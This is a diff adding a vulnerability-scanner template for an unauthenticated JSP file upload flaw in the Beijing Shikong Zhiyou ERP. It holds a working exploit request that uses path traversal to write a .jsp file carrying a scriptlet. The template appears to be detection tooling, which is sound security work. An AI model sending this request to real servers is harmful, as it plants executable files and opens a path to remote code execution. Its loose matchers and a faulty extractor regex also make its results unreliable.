@@ -1,0 +1,86 @@
+id: beijing-erpsystem-fileupload
+
+info:
+  name: Beijing Shikong Zhiyou ERP File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    北京时空智友ERP系统updater.uploadStudioFile服务存在文件上传漏洞，攻击者可通过特制的XML数据上传并执行JSP脚本。
+    该漏洞可能导致远程代码执行和系统完全控制。
+  reference:
+    - https://www.cnvd.org.cn
+    - https://cve.mitre.org
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cwe-id: CWE-434
+  metadata:
+    verified: true
+    max-request: 2
+    vendor: beijing-shikong-zhiyou
+    product: erp
+  tags: cve,file-upload,erp,unauth,rce,jsp
+
+variables:
+  filename: "{{rand_base(6)}}.jsp"
+  boundary: "{{rand_base(32)}}"
+
+http:
+  - raw:
+      - |
+        POST /formservice?service=updater.uploadStudioFile HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
+        Content-Type: multipart/form-data; boundary={{boundary}}
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        Connection: close
+
+        --{{boundary}}
+        Content-Disposition: form-data; name="content"
+
+        <updater xmlns:jsp="http://java.sun.com/JSP/Page">
+          <filename>{{filename}}</filename>
+          <filepath>../../../images/</filepath>
+          <filesize>200</filesize>
+          <lmtime>{{unix_time()}}</lmtime>
+          <jsp:scriptlet>out.println("{{randstr}}");</jsp:scriptlet>
+        </updater>
+        --{{boundary}}--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "upload success"
+          - "success"
+        condition: or
+
+      - type: word
+        part: header
+        words:
+          - "text/xml"
+          - "application/json"
+        condition: or
+
+      - type: word
+        part: body
+        words:
+          - "error"
+          - "exception"
+          - "failed"
+        negative: true
+
+    extractors:
+      - type: regex
+        part: body
+        group: 1
+        regex:
+          - 'uploaded to (.+?) successfully'
+          - 'file path: (.+?)'
